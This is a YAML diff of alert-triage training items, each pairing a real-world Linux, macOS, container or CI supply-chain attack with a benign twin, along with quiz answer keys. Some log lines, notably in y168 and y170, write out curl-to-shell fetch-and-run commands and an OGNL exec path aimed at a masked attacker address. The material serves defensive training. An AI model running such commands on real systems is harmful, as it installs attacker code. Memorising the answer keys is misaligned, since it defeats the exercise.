@@ -1,0 +1,330 @@
+# ON SHIFT alerts, drop 3, part 4: Linux, macOS, containers, CI/CD and supply chain real-world cases + benign twins (y161-y180)
+- id: y161
+  d: linux
+  src: 'Linux · auditd + osquery'
+  t: 'sshd loads liblzma'
+  h: 'jump-prod-04 · sshd'
+  l: ['osquery process_open_files: sshd (pid 2214, parent systemd) maps /lib/x86_64-linux-gnu/liblzma.so.5.6.1 through libsystemd.so.0', 'package: xz-utils 5.6.1-1 from the unstable component, installed 9 days ago by apt on a host in the stable fleet group', 'ssh auth: median CPU per handshake 480 ms, baseline 90 ms; 40 logins an hour from the admin VPN pool, no failed-password burst']
+  v: 1
+  x: T1195.002
+  c: sshd-liblzma-load
+  k: [1, 2]
+  diff: 3
+  trap: bland
+  say: 'The jump host sshd maps liblzma 5.6.1 from the unstable component, and handshake CPU rose from 90 to 480 milliseconds.'
+  tell: 'The sshd to liblzma link exists only because Debian patches OpenSSH to use libsystemd, which is exactly the path the xz backdoor rode in 2024. Version 5.6.1 from unstable on a stable-fleet host, plus handshake CPU up fivefold with no brute-force load to explain it, is the latency tell that exposed it. Isolate, downgrade, compare hashes.'
+  q:
+    kind: contain
+    ask: First action?
+    o: ['Pull the host from the fleet and verify sshd and liblzma against package hashes', 'Raise the sshd rate limit and close the alert', 'Restart sshd to clear the load']
+    a: 0
+    why: 'A backdoored library sits in every login path, so isolate and verify binaries before anyone else authenticates.'
+- id: y162
+  d: linux
+  src: 'Linux · auditd + osquery'
+  t: 'sshd loads liblzma'
+  h: 'jump-prod-07 · sshd'
+  l: ['osquery process_open_files: sshd (pid 1980, parent systemd) maps /lib/x86_64-linux-gnu/liblzma.so.5.4.1 through libsystemd.so.0', 'package: xz-utils 5.4.1 from the Debian 12 stable repo, unchanged since the image build 61 days ago; the host passes the fleet hash check', 'ssh auth: median CPU per handshake 85 ms (baseline 90 ms); the load alert comes from 3,100 failed password attempts a minute from 185.x.x.x']
+  v: 0
+  x: T1195.002
+  c: sshd-liblzma-load
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'The jump host sshd maps liblzma 5.4.1 from the stable repo, and CPU rose during 3,100 failed password attempts a minute from one address.'
+  tell: 'Every Debian and Ubuntu sshd pulls liblzma in through libsystemd, so the mapping alone means nothing. Here it is the old 5.4 series from the stable repo, hashes match the fleet, per-handshake cost sits at baseline, and the CPU is a scanner hammering passwords.'
+- id: y163
+  d: linux
+  src: 'Linux · EDR + egress proxy'
+  t: 'npm install hook makes outbound request'
+  h: 'build-agent-09 · svc-build'
+  l: ['process: node node_modules/pkgfmt/lib/setup.js (npm lifecycle postinstall of pkgfmt@3.2.8), parent npm ci in the web-portal workspace', 'package: pkgfmt 3.2.8 published 2 h 10 min ago by a maintainer added 3 days ago; versions 3.2.0 to 3.2.7 had no install script', 'file reads by the hook: ~/.npmrc, ~/.aws/credentials, ~/.config/gh/hosts.yml and the full environment', 'egress: HTTPS POST of 41 KB to webhook.site, not on the build proxy allowlist; npm ci then exited 0']
+  v: 1
+  x: T1195.002
+  c: npm-postinstall-egress
+  k: [1, 2]
+  diff: 3
+  trap: bland
+  say: 'A dependency published two hours ago ran an install hook that read npm and cloud credential files and posted to a public webhook receiver.'
+  tell: 'A patch release two hours old, from a maintainer added three days ago, suddenly has an install script that reads npmrc, cloud credentials and the whole environment before posting to a webhook site. Same shape as the ua-parser-js hijack and the credential-stealing npm worm campaigns (Shai-Hulud). Rotate every token that agent held.'
+  q:
+    kind: contain
+    ask: First action?
+    o: ['Isolate the agent, rotate the npm, AWS and GitHub tokens it held, pin the dependency back', 'Delete node_modules and rebuild', 'Block webhook.site at the proxy and move on']
+    a: 0
+    why: 'The hook already read the credentials, so the tokens are burned; a proxy block does not undo that.'
+- id: y164
+  d: linux
+  src: 'Linux · EDR + egress proxy'
+  t: 'npm install hook makes outbound request'
+  h: 'build-agent-12 · svc-build'
+  l: ['process: node index.js --exec install (npm lifecycle postinstall of cypress@13.13.0), parent npm ci in the web-portal workspace', 'package: cypress 13.13.0 in package-lock since a PR merged 7 weeks ago; registry integrity hash matches the lockfile, maintainers unchanged', 'file reads by the hook: its own cache directory ~/.cache/Cypress only; environment read: CYPRESS_INSTALL_BINARY and HTTP_PROXY', 'egress: HTTPS GET of 214 MB from download.cypress.io through the build proxy (allowlisted), checksum verified; npm ci then exited 0']
+  v: 0
+  x: T1195.002
+  c: npm-postinstall-egress
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A pinned test-runner dependency ran its install hook, read only its cache directory and downloaded a 214 megabyte binary through the build proxy.'
+  tell: 'Install scripts look scary on paper, but plenty of real packages use them to fetch a native binary: cypress, puppeteer, prisma engines. This one has been pinned in the lockfile for seven weeks, the integrity hash matches, it reads only its own cache and downloads from its vendor through the allowlisted proxy.'
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: ['Alert on hooks from packages new to the lockfile or reading credential files, not every hook', 'Block all npm install scripts org-wide', 'Exclude the build agents from the rule']
+    a: 0
+    why: 'Keep the signal that separates a stealer from a binary fetch: new version provenance and credential reads.'
+- id: y165
+  d: linux
+  src: 'Linux · EDR + egress proxy'
+  t: 'npm install hook makes outbound request'
+  h: 'build-agent-15 · svc-build'
+  l: ['process: node-pre-gyp install --fallback-to-build (npm lifecycle install of bcrypt@5.1.1), then node-gyp rebuild with gcc and make children, parent npm ci', 'package: bcrypt 5.1.1 served by the internal Artifactory mirror, unchanged in the lockfile for 4 months, integrity matches', 'egress: HTTPS GET to nodejs.org for node headers through the build proxy (allowlisted); no other outbound connections', 'file activity: writes build/Release/bcrypt_lib.node inside the workspace only; no reads outside node_modules and the workspace']
+  v: 0
+  x: T1195.002
+  c: npm-postinstall-egress
+  k: [2, 3]
+  diff: 2
+  trap: scary
+  say: 'An install hook compiled a native addon with gcc and make, fetched node headers through the proxy and wrote only inside the workspace.'
+  tell: 'An install hook spawning gcc and make looks like a dropper compiling its payload, but this is node-gyp doing what it does for every native addon. Headers come from nodejs.org through the allowlisted proxy, writes stay in the workspace, and nothing reads credential files.'
+- id: y166
+  d: cloud
+  src: 'GitHub Actions · workflow run log'
+  t: 'Large encoded blob in workflow log'
+  h: 'repo: corp/payments-web · workflow: ci.yml'
+  l: ['step: Get changed files · uses: tj-actions/changed-files@v44 (tag reference), tag moved at 14:09 UTC, step ran at 14:31 UTC on a self-hosted runner', 'step output: a 2,180-character base64 string printed twice in the log, decoding to another base64 string of NAME=value pairs', 'runner EDR: python3 spawned by the step read /proc/<pid>/mem of Runner.Worker, then the output went to the log', 'the repo is public so the log is readable by anyone; AWS_ACCESS_KEY_ID and DEPLOY_TOKEN do not show as *** in the encoded text']
+  v: 1
+  x: T1003.007
+  c: ci-log-secret-dump
+  k: [1, 2]
+  diff: 3
+  say: 'A step using a version tag of a changed-files action printed a long encoded string twice in a public log after Python read runner memory.'
+  tell: 'The action is referenced by tag, tags are mutable, and this one moved 22 minutes before the run. Then a python child read the runner worker memory and the log gained a doubly encoded blob with secrets the masker never saw. That is the tj-actions/changed-files incident of March 2025: rotate everything the repo could reach.'
+  q:
+    kind: contain
+    ask: First action?
+    o: ['Rotate every secret the repo and org exposed, then pin actions to full SHAs', 'Delete the workflow run and move on', 'Re-run the workflow with debug logging']
+    a: 0
+    why: 'The log was public while the secrets were in it, so deleting it does not undo exposure; rotate first.'
+- id: y167
+  d: cloud
+  src: 'GitHub Actions · workflow run log'
+  t: 'Large encoded blob in workflow log'
+  h: 'repo: corp/payments-api · workflow: release.yml'
+  l: ['step: Get changed files · uses: tj-actions/changed-files pinned to a full 40-character commit SHA from before the tag move, bumped only through reviewed Renovate PRs', 'step output: cosign verify-attestation printed a 2,410-character base64 payload once; it decodes to in-toto JSON with SLSA provenance and a signature', 'runner EDR: no process read /proc of Runner.Worker, python3 was not executed in the job; secrets in the log show as ***', 'the repo is public; the provenance payload holds no secret material and is also stored as a registry attestation']
+  v: 0
+  x: T1003.007
+  c: ci-log-secret-dump
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'The workflow step pins a changed-files action to a full commit SHA, a verify step printed an encoded provenance payload once, and secrets appear masked.'
+  tell: 'A big base64 blob in a public log is the tj-actions tell, but this one is cosign verify-attestation output: a signed in-toto payload with provenance and nothing secret. The action is pinned to a full SHA, nobody read runner memory, and secrets stay as ***. Decode before you panic.'
+- id: y168
+  d: linux
+  src: 'Docker daemon · API audit'
+  t: 'Container created through remote API'
+  h: 'docker-host-31 · tcp/2375'
+  l: ['api: POST /containers/create then /start from 185.x.x.x over plain TCP 2375, no TLS client certificate (daemon.json hosts: tcp://0.0.0.0:2375)', 'container: image alpine:latest, Privileged true, bind /:/mnt read-write, command chroot /mnt sh -c "curl -s http://185.x.x.x/kd.sh | sh"', 'host effect 4 min later: kdevtmpfsi at 780% CPU in /tmp and a new root crontab entry written through the bind mount', 'port 2375 is reachable from 0.0.0.0/0 (security group), opened 6 days ago for a Docker plugin test']
+  v: 1
+  x: T1610
+  c: docker-api-remote-create
+  k: [0, 1]
+  diff: 2
+  say: 'A container was created over the plain Docker API port from an internet address, mounting host root read-write and fetching a script.'
+  tell: 'An unauthenticated Docker API on 2375 is root for anyone who can reach it. This is a known botnet playbook (Kinsing): privileged alpine, host root bind-mounted, chroot, curl piped to shell, then the kdevtmpfsi miner and a cron entry. Close the port, then hunt the host.'
+  q:
+    kind: contain
+    ask: First action?
+    o: ['Block 2375 at the edge and isolate the host', 'Kill the kdevtmpfsi process only', 'Restart the Docker daemon']
+    a: 0
+    why: 'The miner is the symptom; the open root-equivalent API is the door, and the cron entry will bring it back.'
+- id: y169
+  d: linux
+  src: 'Docker daemon · API audit'
+  t: 'Container created through remote API'
+  h: 'docker-host-32 · tcp/2376'
+  l: ['api: POST /containers/create then /start from 10.20.x.x (jenkins-ctrl-02) over TLS 2376, client certificate CN=jenkins-docker-cloud verified against the corp CA', 'container: image registry.corp.com/ci/maven:3.9 (signed, digest pinned), Privileged false, named volume m2-cache, no host path binds, entrypoint jenkins-agent', 'host effect: the container joins Jenkins as an agent within 12 s, runs one build and is removed after 6 min; CPU 180% during compile', 'port 2376 is reachable only from the CI subnet (security group), same pattern for the last 5 months']
+  v: 0
+  x: T1610
+  c: docker-api-remote-create
+  k: [0, 1]
+  diff: 3
+  trap: scary
+  say: 'The CI controller created a container over the TLS Docker API with a signed internal image, no host bind and no privileges.'
+  tell: 'Remote container creation, a build container burning 180 percent CPU and an exposed Docker API all look like miner staging. The tells are mutual TLS with the CI certificate, a signed pinned image, a named volume instead of a host bind, and a build that ends in six minutes. The plaintext version of this has no certificate and mounts host root.'
+- id: y170
+  d: linux
+  src: 'Linux · auditd execve'
+  t: 'Java process spawns shell'
+  h: 'wiki-prod-02 · confluence'
+  l: ['execve: /bin/sh -c (curl -s http://185.x.x.x/x.sh || wget -qO- http://185.x.x.x/x.sh) | sh, parent java (Confluence JVM, pid 1842), cwd /opt/atlassian/confluence/bin', 'proxy log 1 s earlier: GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28...%29%7D/ from 185.x.x.x, HTTP 302, no session cookie', 'application: Confluence Server 7.18.0, the June fix release is not yet applied', 'the child shell then ran id and cat /etc/passwd, wrote /tmp/.x and opened an outbound TCP session to 185.x.x.x:443']
+  v: 1
+  x: T1190
+  c: java-app-shell-child
+  k: [0, 1]
+  diff: 2
+  say: 'The wiki Java process spawned a shell that piped a downloaded script into sh, one second after a cookieless request with an encoded path.'
+  tell: 'A Java process should not hand the internet a shell. An unauthenticated GET whose path carries an OGNL expression, a shell child a second later and curl piped to sh is the Confluence OGNL injection shape from June 2022. Patch, then rebuild the host.'
+- id: y171
+  d: linux
+  src: 'Linux · auditd execve'
+  t: 'Java process spawns shell'
+  h: 'ci-ctrl-02 · jenkins'
+  l: ['execve: /bin/sh -xe /var/lib/jenkins/workspace/web-portal@tmp/durable-3f9a/script.sh, parent java (Jenkins JVM, pid 911), cwd /var/lib/jenkins/workspace/web-portal', 'trigger: POST /github-webhook/ from 140.82.x.x (GitHub hook range) started pipeline run 4128 of web-portal; the run page is polled by an authenticated user', 'script content (pipeline sh step): git fetch, npm ci, npm test; children git and node; no outbound connection except the internal Git mirror and the registry mirror', 'Jenkinsfile last changed by a reviewed PR 2 days ago; the controller runs the current LTS']
+  v: 0
+  x: T1190
+  c: java-app-shell-child
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'The Jenkins Java process ran a durable-task shell script for a pipeline run started by a repository webhook, calling git and node against mirrors.'
+  tell: 'A shell under a Java parent is exactly what a pipeline sh step looks like: a durable-task script in workspace@tmp, started by a repository webhook, doing git fetch and npm test against internal mirrors. The pattern to chase is a shell fed by an anonymous request, not one fed by the build queue.'
+  q:
+    kind: tune
+    ask: Best tuning?
+    o: ['Suppress only durable-task script.sh children under the workspace path, keep curl-to-sh from any JVM', 'Exclude every java parent process', 'Disable the rule on CI hosts']
+    a: 0
+    why: 'Scope the exclusion to the build step pattern so request-fed shells from a JVM still alert.'
+- id: y172
+  d: linux
+  src: 'Linux · auditd execve'
+  t: 'Java process spawns shell'
+  h: 'docs-batch-03 · svc-docs'
+  l: ['execve: /bin/sh -c "pdftotext -layout /var/spool/docs/in/inv-88213.pdf - | gzip > /var/spool/docs/out/inv-88213.txt.gz", parent java (docs-ingest.jar, pid 4410)', 'cause: the spool file arrived by SFTP drop from the finance partner; about 1,100 identical executions an hour for 9 months', 'arguments: every path under /var/spool/docs; no URL, no pipe to sh, no outbound connection from the child; no inbound HTTP request to the service in the last 6 h']
+  v: 0
+  x: T1190
+  c: java-app-shell-child
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: 'A batch Java service ran a shell to convert a spooled file, as it has for nine months, with only local paths.'
+  tell: 'A shell child of a JVM is not exploitation on its own. This one converts a spooled PDF with only local paths, no URL, no pipe to sh, at a steady rate for nine months, and nothing arrived over HTTP. Request-fed fetch-and-run is the pattern to chase.'
+- id: y173
+  d: linux
+  src: 'Linux · auditd + auth.log'
+  t: 'pkexec run by unprivileged user'
+  h: 'app-prod-17 · svc-php'
+  l: ['execve: /usr/bin/pkexec with argc 0 (no arguments), uid 1001 svc-php, parent sh from a PHP worker, euid 0 afterwards', 'auth.log: pkexec: The value for the SHELL variable was not found the /etc/shells file; The value for environment variable [XDG_RUNTIME_DIR] contains suspicious content', 'filesystem: new directory GCONV_PATH=. and a gconv-modules file under /tmp/.p, a 14 KB shared object written 2 s earlier', 'polkit 0.105 on Ubuntu 20.04, package policykit-1 below the January 2022 fixed build']
+  v: 1
+  x: T1068
+  c: pkexec-empty-argv
+  k: [0, 1, 2]
+  diff: 2
+  say: 'The web worker user ran pkexec with no arguments and gained root, leaving a GCONV_PATH directory and a shared object in a temp folder.'
+  tell: 'Empty argv from the web user, the two auth.log complaints about SHELL and suspicious environment values, and a GCONV_PATH directory in /tmp are the debris of the PwnKit local root. Euid zero follows. Patch polkit and treat the web host as owned.'
+- id: y174
+  d: linux
+  src: 'Linux · auditd + auth.log'
+  t: 'pkexec run by unprivileged user'
+  h: 'dev-ws-08 · tchen'
+  l: ['execve: /usr/bin/pkexec /usr/sbin/gparted with a full command line, uid 1000 tchen, parent gnome-shell session, DISPLAY :0 set', 'auth.log: pkexec: tchen: Executing command [USER=root] [TTY=unknown] [CWD=/home/tchen] [COMMAND=/usr/sbin/gparted]; authentication through the desktop polkit agent dialog', 'filesystem: no GCONV_PATH directory or new shared objects; polkit 0.105 package policykit-1 at the January 2022 fixed build, patched at image time']
+  v: 0
+  x: T1068
+  c: pkexec-empty-argv
+  k: [0, 1]
+  diff: 2
+  trap: scary
+  say: 'A developer ran pkexec with a full command line from the desktop session, authenticated through the polkit dialog, and no environment complaints were logged.'
+  tell: 'pkexec on a workstation is ordinary when it comes from a desktop session with a real command, the logged Executing command line and an agent password dialog. No SHELL complaints, no GCONV_PATH debris, patched build. The alert fires on the binary name, not on the abuse pattern.'
+- id: y175
+  d: linux
+  src: 'Linux · auditd + kernel log'
+  t: 'BPF program loaded'
+  h: 'db-prod-21 · root'
+  l: ['syscall: bpf(BPF_PROG_LOAD) type tracepoint on sys_enter_getdents64 and sys_enter_read from /dev/shm/.kworker-ev (in no package), uid 0, started from an SSH session from 185.x.x.x', 'dmesg: .kworker-ev[3391] is installing a program with bpf_probe_write_user helper that may corrupt user memory!', 'bpftool prog list: 3 new programs and a pinned map /sys/fs/bpf/.m; the loader is absent from ps after 2 s, a /proc scan still finds pid 3391', 'no eBPF agent (Falco, Tetragon, Cilium, Datadog) is installed or scheduled on this host']
+  v: 1
+  x: T1014
+  c: ebpf-program-load
+  k: [0, 1]
+  diff: 3
+  trap: bland
+  say: 'A root process in shared memory loaded eBPF programs on getdents and read, and the kernel warned about the write-user helper.'
+  tell: 'Hooking getdents64 and read while using bpf_probe_write_user is how eBPF rootkits hide files and rewrite what userland sees; the kernel complains for a reason. The loader runs from /dev/shm and no eBPF vendor agent is deployed here. Public tools in this family: TripleCross, ebpfkit.'
+  q:
+    kind: pivot
+    ask: First pivot?
+    o: ['List loaded BPF programs and pinned maps, and capture the loader binary and memory', 'Reboot the host to clear the programs', 'Delete everything in /dev/shm']
+    a: 0
+    why: 'A reboot or cleanup destroys the loader and the programs; capture first, then contain.'
+- id: y176
+  d: linux
+  src: 'Linux · auditd + kernel log'
+  t: 'BPF program loaded'
+  h: 'k8s-node-14 · root'
+  l: ['syscall: bpf(BPF_PROG_LOAD) types sched_cls and cgroup_sock_addr by cilium-agent (pid 2204, pod in kube-system), uid 0, 40 s after node boot', 'binary: cilium-agent from the quay.io/cilium/cilium image pinned by digest, DaemonSet synced by Argo CD; the same load happens on all 14 nodes', 'bpftool prog list: 61 programs pinned under /sys/fs/bpf/tc/globals owned by cilium; no tracepoint on getdents64 and no bpf_probe_write_user warning in dmesg', 'change: Cilium 1.15.6 rolling upgrade merged in the platform repo; the node was drained and restarted by the upgrade job 3 min earlier']
+  v: 0
+  x: T1014
+  c: ebpf-program-load
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'The Cilium agent loaded eBPF programs at node start after a rolling upgrade, all network types, with nothing hooked on directory reads.'
+  tell: 'A root process loading dozens of eBPF programs looks like a rootkit install, but this is a CNI agent from a digest-pinned image after an upgrade drain: network classifier and socket programs pinned under its own bpffs path, no getdents hooks, no probe-write warning. Judge eBPF by hook point and owner, not by the bpf syscall.'
+- id: y177
+  d: linux
+  src: 'Linux · auditd'
+  t: 'Unix socket connect to ssh-agent'
+  h: 'bastion-02 · root'
+  l: ['process: ssh, uid 0, from a root shell opened at 02:12 UTC through sshd from 185.x.x.x, with SSH_AUTH_SOCK=/tmp/ssh-Zk3NqLw8aT/agent.20871 set by hand', 'socket owner: uid 1043 dnguyen, a forwarded agent from a session on pts/3 opened yesterday 09:40; dnguyen last activity 19 h ago, session idle', 'next: ssh root@db-prod-09 authenticated with the dnguyen key at 02:14 UTC; dnguyen is on leave this week with no login from any source in 11 h']
+  v: 1
+  x: T1563.001
+  c: ssh-agent-socket-use
+  k: [0, 1]
+  diff: 3
+  trap: bland
+  say: 'A root shell used an ssh-agent socket owned by another user, from an idle forwarded session, to authenticate to a database host.'
+  tell: 'Agent forwarding leaves a socket that anyone with root on the box can borrow: no key theft needed, just SSH_AUTH_SOCK pointed at another user agent. The socket owner is a different uid with an idle session, and the root session arrived from an external address at 2 AM.'
+  q:
+    kind: contain
+    ask: First action?
+    o: ['Kill the forwarded session, revoke the key and review logins on the database host', 'Message the user and wait for an answer', 'Change the socket file permissions']
+    a: 0
+    why: 'The borrowed key already reached a database host; end the session, revoke the key and scope what it touched.'
+- id: y178
+  d: linux
+  src: 'Linux · auditd'
+  t: 'Unix socket connect to ssh-agent'
+  h: 'bastion-02 · root'
+  l: ['process: ssh (git transport), uid 0, parent chain sudo -E, bash on pts/3, sshd session of dnguyen from the corporate VPN opened 3 min earlier; SSH_AUTH_SOCK=/tmp/ssh-Zk3NqLw8aT/agent.20871', 'socket owner: uid 1043 dnguyen, the same sshd session and pts/3; the sudoers rule has env_keep+=SSH_AUTH_SOCK for the ops group', 'next: git pull of infra/etc-config over ssh at 14:02 UTC using the forwarded key, the key fingerprint is on the repo access list; the pull ends cleanly and the shell exits']
+  v: 0
+  x: T1563.001
+  c: ssh-agent-socket-use
+  k: [0, 1]
+  diff: 3
+  trap: scary
+  say: 'A root git process used the ssh-agent socket of the operator whose live VPN session ran sudo with preserved environment moments earlier.'
+  tell: 'Root touching a foreign uid agent socket is the hijack signature, but here the process chain walks straight back to the owner sshd session: sudo -E from the owner terminal, three minutes old, over the VPN, with env_keep set for the socket variable. The key is used inside its own session.'
+- id: y179
+  d: macos
+  src: 'macOS · Endpoint Security'
+  t: 'Script displays system dialog'
+  h: 'MBP-DESIGN-14 · lkim'
+  l: ['process: osascript display dialog titled "System Preferences" with a hidden answer field, parent /bin/bash running a script from /Volumes/Install, no signing identity', 'next: dscl /Local/Default -authonly lkim with the typed value, then security find-generic-password -ga "Chrome" and reads of Chrome Login Data, Cookies and a wallet folder', 'egress: a 6.8 MB zip created in /tmp and POSTed over HTTPS to 185.x.x.x /api/ingest, user agent curl/8.4', 'origin: /Volumes/Install mounted 3 min earlier from a disk image downloaded in Safari from a file-sharing page; quarantine flag removed']
+  v: 1
+  x: T1056.002
+  c: macos-fake-password-prompt
+  k: [0, 1]
+  diff: 2
+  say: 'A script from a mounted disk image showed a system-styled dialog with a hidden field, validated the typed password with dscl, then zipped browser data.'
+  tell: 'A fake system settings prompt whose only job is to harvest the login password, checked at once with dscl -authonly, then the keychain, browser stores and wallet folders, and a zip POSTed out. That is the Atomic macOS stealer chain (AMOS), usually delivered through cracked-app disk images. Reset the password and rotate what the browser held.'
+  q:
+    kind: contain
+    ask: First action?
+    o: ['Isolate the Mac, reset the account password and rotate browser-held secrets', 'Delete the disk image and carry on', 'Ask the user to restart the Mac']
+    a: 0
+    why: 'The password was typed and verified and the browser stores left the machine, so credentials are burned.'
+- id: y180
+  d: macos
+  src: 'macOS · Endpoint Security'
+  t: 'Script displays system dialog'
+  h: 'MBP-DESIGN-22 · pdoyle'
+  l: ['process: osascript display dialog titled "Corp IT: FileVault access" with a hidden answer field, parent /bin/bash running /Library/Application Support/JAMF/tmp/Grant-SecureToken.sh, launched by the signed jamf binary (policy 214)', 'next: dscl /Local/Default -authonly pdoyle with the typed value, then sysadminctl -secureTokenOn pdoyle with the admin credential from the policy parameter; the typed value is never written to disk', 'file and network: reads only the local directory service for the secure token state; no browser, keychain or wallet paths; the only connection is to corp.jamfcloud.com (the MDM server)', 'trigger: Jamf policy 214 "Enable FileVault for new users" scoped to a smart group containing pdoyle after the Mac was re-enrolled yesterday']
+  v: 0
+  x: T1056.002
+  c: macos-fake-password-prompt
+  k: [0, 1, 2]
+  diff: 3
+  trap: scary
+  say: 'A Jamf policy script on the Mac showed a password dialog, verified the typed value with dscl, ran sysadminctl, and contacted only the management server.'
+  tell: 'A hidden-field password dialog plus dscl -authonly is the opening of the Atomic stealer, and also exactly how admins script a secure token grant. Here the parent is the signed jamf binary running a policy script, the follow-up is sysadminctl, nothing touches browser or keychain stores, and the only egress is the MDM server.'
